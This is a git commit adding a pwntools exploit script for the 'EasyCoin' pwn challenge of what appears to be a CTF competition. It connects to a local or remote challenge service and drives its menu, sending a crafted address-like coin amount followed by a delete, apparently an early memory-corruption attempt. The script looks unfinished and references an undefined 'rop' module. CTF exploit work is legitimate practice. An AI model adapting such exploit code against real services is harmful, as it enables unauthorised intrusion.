a5b1a82dc4836f14e85714646317a50de579a30c
fade-vivida <38774342+fade-vivida@users.noreply.github.com>
2018-09-10 01:47:28 +0800

    1

---
+++ wangdingbei/1/pwn/EasyCoin/EasyCoin.py
@@ -0,0 +1,114 @@
+from pwn import *
+from ctypes import *
+import os
+#import roputils as rop
+
+remote_addr = "116.62.152.176"
+remote_port = 20001
+
+local_addr = "127.0.0.1"
+local_port = 1807
+
+pc = "./EasyCoin"
+pwn_elf = ELF(pc)
+pwn_rop = rop.ROP(pc)
+
+uselibc = 2 #0 for no,1 for i386,2 for x64
+local = 1
+haslibc = 0
+atta = 1
+
+if uselibc == 2:
+	context.arch = "amd64"
+else:
+	context.arch = "i386"
+
+if uselibc ==2 and haslibc == 0:
+	libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")
+else:
+	if uselibc == 1 and haslibc == 0:
+		libc = ELF('/lib/i386-linux-gnu/libc-2.23.so')
+	else:
+		libc = ELF('./libc.so.6')
+
+if local == 1:
+	if haslibc:
+		p = process(pc,env={'LD_PRELOAD':'./libc.so.6'})
+	else:
+		p = process(pc)
+elif local == 0:
+	p = remote(remote_addr,remote_port)
+	if haslibc:
+		libc = ELF('./libc.so.6')
+else:
+	p = remote(local_addr,local_port)
+	if haslibc:
+		libc = ELF('./libc.so.6')
+
+context.log_level = True
+
+if local:
+	if atta:
+		gdb.attach(p,'b *0x401474\n')
+
+
+def sla(a,b):
+	p.sendlineafter(a,b)
+
+def sa(a,b):
+	p.sendafter(a,b)
+
+def ru(a):
+	p.recvuntil(a)
+
+def rv(a):
+	return p.recv(a)
+
+
+def lg(s,addr):
+	print('\033[1;31;40m%20s-->0x%x\033[0m'%(s,addr))
+
+def register(name,password):
+	sla('> ','1')
+	sla('> ',name)
+	sla('> ',password)
+	sla('> ',password)
+
+def login(name,password):
+	sla('> ','2')
+	sla('> ',name)
+	sla('> ',password)
+
+def display_user():
+	sla('> ','1')
+
+def send_coin(name,cnt):
+	sla('> ','2')
+	sla('> ',name)
+	sla('> ',str(cnt))
+
+def display_trans():
+	sla('> ','3')
+
+def delete():
+	sla('> ','5')
+
+def logout():
+	sla('> ','6')
+
+def hack():
+	raw_input()
+	register('a','a')
+	register('b','b')
+	register('c','c')
+
+	login('a','a')
+	send_coin('b',0x604250)
+	logout()
+
+	login('b','b')
+	send_coin('b',1000)
+	delete()
+
+	p.interactive()
+hack()
